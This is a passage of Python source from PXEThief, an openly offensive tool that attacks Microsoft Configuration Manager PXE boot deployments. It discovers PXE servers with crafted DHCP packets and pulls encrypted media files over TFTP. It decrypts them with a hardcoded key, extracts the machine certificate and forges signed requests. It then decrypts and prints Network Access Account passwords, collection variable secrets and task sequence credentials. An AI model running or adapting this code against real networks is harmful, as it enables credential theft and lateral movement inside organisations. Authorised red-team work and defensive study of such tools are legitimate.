# Copyright (C) 2022 Christopher Panayi, MWR CyberSec
#
# This file is part of PXEThief (https://github.com/MWR-CyberSec/PXEThief).
# 
# PXEThief is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, version 3 of the License.
# 
# PXEThief is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with PXEThief. If not, see <https://www.gnu.org/licenses/>.

from scapy.all import *
import binascii
import string
import ipaddress
import socket
import platform
import configparser
import math
import lxml.etree as ET
import requests
from requests_toolbelt import MultipartEncoder,MultipartDecoder
import zlib
import sys
import datetime
from os import walk,system
from ipaddress import IPv4Network,IPv4Address
from certipy.lib.certificate import load_pfx
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.x509.oid import ExtensionOID, ObjectIdentifier
from cryptography.hazmat.backends import default_backend
from cryptography.x509 import DNSName
import tftpy
import os
from asn1crypto import cms

#Scapy global variables
osName = platform.system()
clientIPAddress = ""
clientMacAddress = ""

#HTTP Configuration Options
USING_PROXY = False #Configure proxying for debugging support

USING_TLS = False #HTTPS and client certificate support
CERT_FILE = "output.crt"
KEY_FILE = "output-key.key"

# MECM Task Sequence Config Options
SCCM_BASE_URL = "" #The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed

# Debug Config Options
DUMP_MPKEYINFORMATIONMEDIA_XML = False
DUMP_REPLYASSIGNMENTS_XML = False
DUMP_POLICIES = False
DUMP_TS_XML = False
DUMP_TS_Sequence_XML = False

# Global Variables
BLANK_PASSWORDS_FOUND = False

def validate_ip_or_resolve_hostname(input):

    try:
        ipaddress.ip_address(input)
        ip_address = input
    except:
        try:
            ip_address = socket.gethostbyname(input.strip())
        except:
            print("[-] " + input + " does not appear to be a valid hostname or IP address (or DNS does not resolve)")
            sys.exit(0)
    
    return ip_address

def print_interface_table():
    print("[!] Set the interface to be used by scapy in manual_interface_selection_by_id in the settings.ini file")
    print()
    print("Available Interfaces:")
    print(conf.ifaces)

def get_config_section(section_name):
    config = configparser.ConfigParser(allow_no_value=True)
    config.read('settings.ini')
    return config[section_name]

def configure_scapy_networking(ip_address):
        
    #If user has provided a target IP address, use it to determine interface to send traffic out of    
    if ip_address is not None:
        ip_address = validate_ip_or_resolve_hostname(ip_address)

        route_info = conf.route.route(ip_address,verbose=0)
        interface_ip = route_info[1]

        if interface_ip != "0.0.0.0":
            conf.iface = route_info[0]
        else:
            print("[-] No route found to target host " + ip_address)
            sys.exit(-1)
    else:
        #Automatically attempt sane interface configuration
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        scapy_config = config["SCAPY SETTINGS"]
        
        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
            except:
                print("Invalid value set for 'manual_interface_selection_by_id' in 'settings.ini' file. Please specify an integer associated with the desired interface, or leave the field blank for automatic interface selection")
                print("Valid interfaces and interface indexes can be checked by running pxethief.py 10")
                sys.exit(-1)
        else:
            manual_selection_mode_id = None

        if manual_selection_mode_id:
            print("[+] Attemting to use Interface ID " + str(manual_selection_mode_id) + " provided in setttings.ini")
            conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
        else:
            print("[+] Attemting automatic interface detection")
            selection_mode = scapy_config.getint("automatic_interface_selection_mode")
            # 1 - Use interface that can reach default GW as output interface, 2 - First interface with no autoconfigure or localhost IP address 
            try_next_mode = False
            if selection_mode == 1:

                default_gw = conf.route.route("0.0.0.0",verbose=0)
                default_gw_ip = conf.route.route("0.0.0.0",verbose=0)[2]
                
                #If there is a default gw found, set scapy to use that interface
                if default_gw_ip != '0.0.0.0':
                    conf.iface = default_gw[0]
                else: 
                    try_next_mode = True

            if selection_mode == 2 or try_next_mode:

                loopback_range = IPv4Network('127.0.0.0/8')
                autoconfigure_ranges = IPv4Network('169.254.0.0/16')

                interfaces = scapy.interfaces.get_working_ifaces()
                for interface in interfaces:
                    
                    #Read IP from interface
                    ip =  get_if_raw_addr(interface)    
                    if ip:
                        ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                    else: 
                        continue

                    #If it is a valid IP and is not a loopback or autoconfigure IP, use this interface
                    if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                        conf.iface = interface
                        break
                    
                #Implement check on conf.iface value
    
    global clientIPAddress
    global clientMacAddress

    clientIPAddress = get_if_addr(conf.iface)
    clientMacAddress = get_if_raw_addr(conf.iface)

    bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
    bind_layers(UDP,BOOTP,dport=68,sport=4011)
    print("[+] Using interface: " + conf.iface + " - " + conf.iface.description)

# Find PXE server with DHCP discover packet with the right options set 
def find_pxe_server():
    
    print("")
    print("Sending initial DHCP Discover to find PXE boot server...")
    print("")
    
    #DHCP Discover packet is from IP 0.0.0.0, with destination 255.255.255.255 and ff:ff:ff:ff:ff:ff destination MAC address. Need to ask for DHCP options 66 and 67 to find PXE servers
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=clientMacAddress)/DHCP(options=[("message-type","discover"),('param_req_list',[1,3,6,66,67]),"end"])

    conf.checkIPaddr = False # Make scapy ignore IP address when checking for responses (needed because we sent to a broadcast address)
    ans = srp1(pkt) #This could fail if multiple DHCP servers exist in the environment and only some of them offer the PXE server in their response
    conf.checkIPaddr = True

    #TODO: Make sure received packet is a DHCP packet, before next bit of code
    if ans:
        packet = ans

        # Pull out DHCP offer from received answer packet
        try: # try packet[0] instead as suggested by onSec-fr
            dhcp_options = packet[1][DHCP].options
        except:
            dhcp_options = packet[0][DHCP].options
        
        tftp_server = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),None)
        if tftp_server:
            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8") # DHCP option 66 is TFTP Server Name
        
            boot_file = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"),None)
            if boot_file:
                boot_file = boot_file.rstrip(b"\0").decode("utf-8") # DHCP option 67 is Bootfile Name
    else:
        print("[-] No DHCP responses received with PXE boot options") 
        sys.exit(-1)
    
    tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())

    print("")
    print("PXE Server IP: " + tftp_server + " Boot File Location: " + boot_file)
    return tftp_server
        
# Ask SCCM for location to download variable file. This is done with a DHCP Request packet
def get_variable_file_path(tftp_server):

    print("")
    print("[+] Asking ConfigMgr for location to download the media variables and BCD files...")
    print("")

    #Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. This contains DHCP options 60, 93, 97 and 250
    pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
    ("message-type","request"),
    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
    ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
    #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
    ('vendor_class_id', b'PXEClient'), 
    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
    "end"])

    ans = sr1(pkt,timeout=10,iface=conf.iface,verbose=2,filter="udp port 4011 or udp port 68") # sr return value: ans,unans/packetpair1,packetpair2 (i.e. PacketPairList)/sent packet,received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)

    #TODO: Make sure received packets are DHCP packets before next bit of code
    encrypted_key = None
    if ans:
        packet = ans
        try:  # try packet[0] instead as suggested by onSec-fr
            dhcp_options = packet[1][DHCP].options
        except:
            dhcp_options = packet[0][DHCP].options
    
        #Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location
        try:
            option_number, variables_file = next(
                opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
        except:
            variables_file = None
        if variables_file:
            packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
            data_length = variables_file[1] #Second byte of the option data is the length of data that follows

            #If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                #Skip first two bytes of option and copy the file name by data_length
                variables_file = variables_file[2:2+data_length] 
                variables_file = variables_file.decode('utf-8')
            #If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
            elif packet_type == 2:
                #Skip first two bytes of option and copy the encrypted data by data_length
                encrypted_key = variables_file[2:2+data_length]
                #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2

                #Read out string length
                string_length = variables_file[string_length_index]

                #Read out variables.dat file name and decode to utf-8 string
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length] 
                variables_file = variables_file.decode('utf-8')
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
        else:
            print("[-] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location") 
            sys.exit(-1)
    else:
        print("[-] No DHCP responses recieved from MECM server " + tftp_server + ". This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports") 
        sys.exit(-1)
    
    print("")
    print("[!] Variables File Location: " + variables_file)
    print("[!] BCD File Location: " + bcd_file)

    if encrypted_key:
        global BLANK_PASSWORDS_FOUND
        BLANK_PASSWORDS_FOUND = True

        print("[!] Blank password on PXE boot found!")
        return [variables_file,bcd_file,encrypted_key]
    else:
        return [variables_file,bcd_file]

def get_pxe_files(ip):

    if ip != None:
        print("[+] Targeting user-specified host: " + ip)
        tftp_server_ip = validate_ip_or_resolve_hostname(ip)
    else:
        print("[+] Discovering PXE Server through DHCP...")
        tftp_server_ip = find_pxe_server()
        print("[+] PXE Server found from DHCP at " + tftp_server_ip + "!")

    answer_array = get_variable_file_path(tftp_server_ip)

    variables_file = answer_array[0]
    bcd_file = answer_array[1]
    if BLANK_PASSWORDS_FOUND:
        encrypted_key = answer_array[2]

    tftp_download_string = ""

    #TFTP works over UDP by having a client pick a random source port to send the request for a file from. The server then connects back to the client on this selected source port to transmit the selected data that is then acknowledged by the client. Full bidirectional comms is required between the server on port 69 and the selected ephemeral ports on the server and client in order for a transfer to complete successfully 
    if osName == "Windows":
        var_file_download_cmd = "tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n"
        var_file_name = variables_file.split("\\")[-1]
        tftp_download_string = ("tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" +
        "tftp -i " + tftp_server_ip + " GET " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\"")
    else:
        var_file_download_cmd = "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" 
        tftp_download_string = var_file_download_cmd + "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\""
        var_file_name = variables_file.split("\\")[-1]
        '''
        print("Or, if you have atftp installed: ")
        print("")
 
        tftp_download_string = ("atftp --option \"blksize 1428\" --verbose " + 
        tftp_server_ip + 
        " << _EOF_\n" + 
        "mode octet\n" + 
        "get " + variables_file + " " + variables_file.split("\\")[-1] + "\n" +
        "get " + bcd_file + " " + bcd_file.split("\\")[-1] + "\n" +
        "quit\n" +
        "_EOF_\n" )
        '''
    tftp_client = tftpy.TftpClient(tftp_server_ip, 69)
    tftp_client.download(variables_file, variables_file.split("\\")[-1])
    tftp_client.download(bcd_file, bcd_file.split("\\")[-1])


#    print("[+] Use this command to grab the files: ")
#    print(tftp_download_string)
    if BLANK_PASSWORDS_FOUND:
            config = configparser.ConfigParser(allow_no_value=True)
            config.read('settings.ini')
            general_config = config["GENERAL SETTINGS"]
            auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
            if auto_exploit_blank_password:
                print("[!] Attempting automatic exploitation.")
                use_encrypted_key(encrypted_key,var_file_name)
            else:
                print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
    else:
        print("[+] User configured password detected for task sequence media. Attempts can be made to crack this password using the relevant hashcat module")

def generateSignedData(data,cryptoProv):

    #SHA1 hash algorithm
    sha1hash = cryptoProv.CryptCreateHash(32772,None)
    sha1hash.CryptHashData(data)

    #Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha1hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def generateClientTokenSignature(data,cryptoProv):
    #SHA256 hash algorithm
    sha256hash = cryptoProv.CryptCreateHash(32780,None)
    sha256hash.CryptHashData(data)

    #Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha256hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def generateSignedDataLinux(data,key):
    from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
    from cryptography.hazmat.primitives import hashes
    signature = key.sign(data, PKCS1v15(), hashes.SHA1())
    signature_rev = bytearray(signature)
    signature_rev.reverse()
    return bytes(signature_rev)

def CryptDecryptMessage(pfx, data):
    info = cms.ContentInfo.load(data)
    digested_data = info['content']
    key_algo = digested_data['recipient_infos'].native[0]['key_encryption_algorithm']['algorithm']
    key = b""
    if key_algo == 'rsaes_pkcs1v15':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        key = pfx.decrypt(session_key, padding.PKCS1v15())
    elif key_algo == 'rsaes_oaep':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        pad = padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None)
        key = pfx.decrypt(session_key, pad)
    else:
        print(f"{key_algo} not implemented yet")

    iv = digested_data['encrypted_content_info']['content_encryption_algorithm']['parameters'].native
    ciphertext = digested_data['encrypted_content_info']['encrypted_content'].native
    decrypted_data = b""
    enc_algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
    if enc_algo == 'tripledes_3key':
        #algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
        #print(f"{algo} not implemented yet")
        decrypted_data = _3des_decrypt_raw(ciphertext, key, iv)
    elif enc_algo == 'aes256_cbc':
        decrypted_data = aes256_decrypt_raw(ciphertext, key, iv)
    else:
        print(f"{enc_algo} not implemented yet")
    return decrypted_data

def deobfuscate_credential_string(credential_string):
    #print(credential_string)
    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])

    key = aes_des_key_derivation(key_data)
    last_16 = math.floor(len(encrypted_data)/8)*8
    return _3des_decrypt(encrypted_data[:last_16],key[:24])

def decrypt_media_file(path, password):

    password_is_string = True
    print("[+] Media variables file to decrypt: " + path)
    if type(password) == str:
        password_is_string = True
        print("[+] Password provided: " + password)
    else:
        password_is_string = False
        print("[+] Password bytes provided: 0x" + password.hex())

    # Decrypt encryted media variables file
    encrypted_file = read_media_variable_file(path) 
    try:
        if password_is_string:
            key = aes_des_key_derivation(password.encode("utf-16-le"))
        else:
            key = aes_des_key_derivation(password)
        last_16 = math.floor(len(encrypted_file)/16)*16
        decrypted_media_file = aes128_decrypt(encrypted_file[:last_16],key[:16])
        decrypted_media_file =  decrypted_media_file[:decrypted_media_file.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
        print("[+] Successfully decrypted media variables file with the provided password!")
        #write_to_file("ts_media_variables",wf_decrypted_ts)
    except:
        print("[-] Failed to decrypt media variables file. Check the password provided is correct")
        sys.exit(-1)
    
    return wf_decrypted_ts

def process_pxe_bootable_and_prestaged_media(media_xml):

    #Parse media file in order to pull out PFX password and PFX bytes
    root = ET.fromstring(media_xml.encode("utf-16-le"))
    smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text 
    smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text

    global SCCM_BASE_URL
    if SCCM_BASE_URL == "":
        print("[+] Identifying Management Point URL from media variables (Subsequent requests may fail if DNS does not resolve!)")
        #Partial Media - SMSTSLocationMPs
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
        if SMSTSMP is not None:
            SCCM_BASE_URL = SMSTSMP.text
        elif SMSTSLocationMPs is not None:
            SCCM_BASE_URL = SMSTSLocationMPs.text
        
        print("[+] Management Point URL set to: " + SCCM_BASE_URL)
    else:
        print("[+] Using manually set Management Point URL of: " + SCCM_BASE_URL)
    
    dowload_and_decrypt_policies_using_certificate(smsMediaGuid,smsTSMediaPFX) 

def process_full_media(password, policy):

    encrypted_policy = read_media_variable_file(policy) 
    
    try:
        print("[+] Password provided for policy decryption: " + password)
        key = aes_des_key_derivation(password.encode("utf-16-le"))
        last_16 = math.floor(len(encrypted_policy)/16)*16
        decrypted_ts = aes128_decrypt(encrypted_policy[:last_16],key[:16])
        decrypted_ts =  decrypted_ts[:decrypted_ts.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
        print("[+] Successfully Decrypted Policy \"" + policy +"\"!")
        
    except:
        print("[-] Failed to decrypt policy")
        sys.exit(-1)

    process_task_sequence_xml(wf_decrypted_ts)
    process_naa_xml(wf_decrypted_ts)

def use_encrypted_key(encrypted_key, media_file_path):

    #ProxyDHCP Option 243
    length = encrypted_key[0]
    encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
    encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes

    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll

    key = aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response

    var_file_key = (aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
    
    #Perform bit extension
    LEADING_BIT_MASK =  b'\x80'
    new_key = bytearray()
    for byte in struct.unpack('10c',var_file_key):
        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
            new_key = new_key + byte + b'\xFF'
        else:
            new_key = new_key + byte + b'\x00'

    media_variables = decrypt_media_file(media_file_path,new_key)
    
    print("[!] Writing media variables to variables.xml")
    write_to_file("variables",media_variables)
    
    #Parse media file in order to pull out PFX password and PFX bytes
    root = ET.fromstring(media_variables.encode("utf-16-le"))
    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
    filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
    
    print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
    write_to_binary_file(filename,smsTSMediaPFX)
    check_clientauthcert(filename, smsMediaGuid)
    process_pxe_bootable_and_prestaged_media(media_variables)


def check_clientauthcert(certificate, password):
    # Check if certificate contains client auth
    subject = None
    pfx_file = certificate
    pfx_password = bytes(password, encoding= 'utf-8')
    # Read PFX
    with open(pfx_file, "rb") as f:
        pfx_data = f.read()
    private_key, certificate, additional_certificates = pkcs12.load_key_and_certificates(pfx_data, pfx_password, backend=default_backend())
    subject = certificate.subject
    if subject.rdns:
        subject = subject.rdns
    else:
        try:
            san_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
            san = san_extension.value
            dns_names = san.get_values_for_type(DNSName)
            if dns_names:
                subject = dns_names[0]
        except Exception as e:
            print(e)

    # Check OID 1.3.6.1.5.5.7.3.2 (clientAuth)
    try:
        extended_key_usage_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
        extended_key_usage = extended_key_usage_extension.value
        client_auth_oid = ObjectIdentifier("1.3.6.1.5.5.7.3.2")
        if client_auth_oid in extended_key_usage:
            print("[!] PFX - Client Authentication is enabled for subject " + subject + ". You can try to use it to authenticate as the machine account!")
    except Exception as e:
        print(e)


#Parse the downloaded task sequences and extract sensitive data if present
def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
    smsMediaGuid = guid
    # CCMClientID header is equal to smsMediaGuid from the decrypted media file
    CCMClientID = smsMediaGuid
    smsTSMediaPFX = binascii.unhexlify(cert_bytes)

    key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
    print('[+] Generating Client Authentication headers using PFX File...')

    data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
    # CCMClientIDSignature = generateSignedData(data,cryptoProv)
    CCMClientIDSignature = CryptoTools.sign(key, data)
    print("[+] CCMClientID Signature Generated")

    CCMClientTimestamp = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0).isoformat() + 'Z'
    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
    # CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
    CCMClientTimestampSignature = CryptoTools.sign(key, data)
    print("[+] CCMClientTimestamp Signature Generated")

    clientToken = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
    # clientTokenSignature = str(generateSignedData(data,cryptoProv))
    clientTokenSignature = CryptoTools.sign(key, clientToken).hex().upper()

    print("[+] ClientToken Signature Generated")
    
    try:
        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key)
    except Exception as e:
        print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm")
        print()
        print("Fix network connectivity issues by ensuring you can connect to the HTTP port on the server and fixing DNS issues or by using the SCCM_BASE_URL to hardcode the beginning of the URL used to access the MP: e.g. http://192.168.56.101")
        print()
        print("The SHA1 signing algorithm is implemented by generateSignedData and the SHA256 signing algorithm is implemented by generateClientTokenSignature")
        print("If you encountered errors, for CCMClientIDSignature, CCMClientTimestampSignature and clientTokenSignature change the current signing algorithm to the one not in use")
        print(e)
        sys.exit(-1)

    for colsetting in colsettings:
        print("\n[+] Collection Variables found for 'All Unknown Computers' collection!")

        #Check to see if Collection Variables are encrypted
        data = False
        try:
            data = colsetting.content.decode("utf-16-le")
            data = True
        except (UnicodeDecodeError, AttributeError):
            #print("a") #Will hit this code branch if running over cleartext and the collection variables are not encrypted
            pass

        if USING_TLS or data:
            wf_dstr = colsetting.content.decode("utf-16-le")
        else:        

            dstr = CryptDecryptMessage(key,colsetting.content)
            dstr = dstr.decode("utf-16-le")
            wf_dstr = "".join(c for c in dstr if c.isprintable())
            #print(wf_dstr)
        
        root = ET.fromstring(wf_dstr)
        dstr = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
        wf_dstr = "".join(c for c in dstr if c.isprintable()) 
        write_to_file("CollectionSettings", wf_dstr)
        #wf_dstr = dstr[dstr.find('<')-1:dstr.rfind('>')+1]
        root = ET.fromstring(wf_dstr)

        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")

        for instance in instances:
            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text 
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text 

            print("\n[!] Collection Variable Name: '" + collection_var_name +"'")
            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
            print("[!] Collection Variable Secret: '" + collection_var_secret + "'")
    
    print("\n[+] Decrypting Network Access Account Configuration")
    for naaConfig in naaConfigs:
        if USING_TLS:
            dstr = naaConfig.content.decode("utf-16-le")
        else:
            dstr = CryptDecryptMessage(key,naaConfig.content)
            dstr = dstr.decode("utf-16-le")
        
        wf_dstr = "".join(c for c in dstr if c.isprintable())
        process_naa_xml(wf_dstr)
        
    print()
    print("[+] Decrypting Task Sequence Configuration\n")
    for tsConfig in tsConfigs:

        if USING_TLS:
            dstr = tsConfig.content.decode("utf-16-le")
        else:
            dstr = CryptDecryptMessage(key,tsConfig.content)
            dstr = dstr.decode("utf-16-le")

        wf_dstr = "".join(c for c in dstr if c.isprintable())
        tsSequence = process_task_sequence_xml(wf_dstr)
    

def process_naa_xml(naa_xml):
    
    print("[+] Extracting password from Decrypted Network Access Account Configuration\n")
    root = ET.fromstring(naa_xml[:naa_xml.rfind('>')+1])
    network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")

    for naa_settings in network_access_account_xml:
        
        network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
        network_access_username = network_access_username[:network_access_username.rfind('\x00')]
        print("[!] Network Access Account Username: '" + network_access_username + "'")

        network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
        network_access_password = network_access_password[:network_access_password.rfind('\x00')]
        print("[!] Network Access Account Password: '" + network_access_password+"'")

def process_task_sequence_xml(ts_xml):
    root = ET.fromstring(ts_xml[:ts_xml.rfind('>')+1])

    pkg_name = root.xpath("//*[@name='PKG_Name']/value")[0].text 
    adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[0].text
    ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[0].text

    tsName = pkg_name + "-" + adv_id
    keepcharacters = (' ','.','_', '-')
    tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()

    #Is TS_Sequence plaintext? This is the case when processing TS from full media and may be the case for TS transmitted over HTTPS?
    if ts_sequence_tag[:9] == "<sequence":
        tsSequence = ts_sequence_tag
    else:
        try:
            tsSequence = deobfuscate_credential_string(ts_sequence_tag)
            print("[!] Successfully Decrypted TS_Sequence XML Blob in Task Sequence '" + pkg_name + "'!")
        except:
            print("Failed to decrypt TS_Sequence in '" + pkg_name + "'. The encryption used on the SCCM server may be different than expected?")
            return
        
    tsSequence = tsSequence[:tsSequence.rfind(">")+1]
    tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()
    
    if DUMP_TS_XML:
        print("[!] Writing decrypted TaskSequence policy XML to 'TaskSequence_policy_" + tsName + ".xml'.")
        f = open("TaskSequence_policy_" + tsName + ".xml", "w")
        f.write(tsSequence)
        f.close()

    if DUMP_TS_Sequence_XML:    
        print("[!] Writing decrypted TS_Sequence XML to '" + tsName + ".xml'. This can be manually inspected for credentials")
        
        f = open(tsName + ".xml", "w")
        f.write(tsSequence)
        f.close()
        
    print("[+] Attempting to automatically identify credentials in Task Sequence '" + pkg_name + "':\n")    
    analyse_task_sequence_for_potential_creds(tsSequence)

def write_to_file(filename, contents):
    f = open(filename + ".xml", "w")
    f.write(contents)
    f.close()
    
def write_to_binary_file(filename, contents):
    f = open(filename, "wb")
    f.write(contents)
    f.close()

def analyse_task_sequence_for_potential_creds(ts_xml):
    #Known tags: property="DomainPassword" name="OSDJoinPassword", property="DomainUsername" name="OSDJoinAccount", property="AdminPassword" name="OSDLocalAdminPassword", property="RegisteredUserName" name="OSDRegisteredUserName", property="CapturePassword" name="OSDCaptureAccountPassword", property="CaptureUsername" name="OSDCaptureAccount"
    tree = ET.fromstring(ts_xml).getroottree()

    keyword_list = ["password", "account", "username"]
    element_search_list = []
    
    for word in keyword_list:
        # TODO  search through different attributes other than name? 
        element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word +'")]')]) 
    
    parent_list = []
    creds_found = False
    for word, elements in element_search_list:
        for element in elements:
            if not creds_found:
                print("[!] Possible credential fields found!\n")
                creds_found = True
            parent = element.getparent() # TODO if parent is defaultvarlist
            if parent not in parent_list:
                parent_list.append(parent)
                print("In TS Step \"" + parent.getparent().attrib["name"]+"\":")
                unique_words = [x for x in keyword_list if x != word]

                par = ET.ElementTree(parent)
                for unique_word in unique_words:

                    for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                        if el != element: #duplicate tags that match more than one keyword
                            print(el.attrib["name"] + " - " + el.text)        
                    
                print(element.attrib["name"] + " - " + str(element.text))
                print()
    
    if not creds_found:
        print("[!] No credentials identified in this Task Sequence.\n")
        #print("[!] Look through it for credentials by searching for tags and properties with the words 'Account', 'Username', 'Password'")

#Retrieve all available TSs, the NAA config and any identified collection settings and return to parsing function
def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key):

    #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    #print("[+] Retrieving Needed Metadata from SCCM Server...")
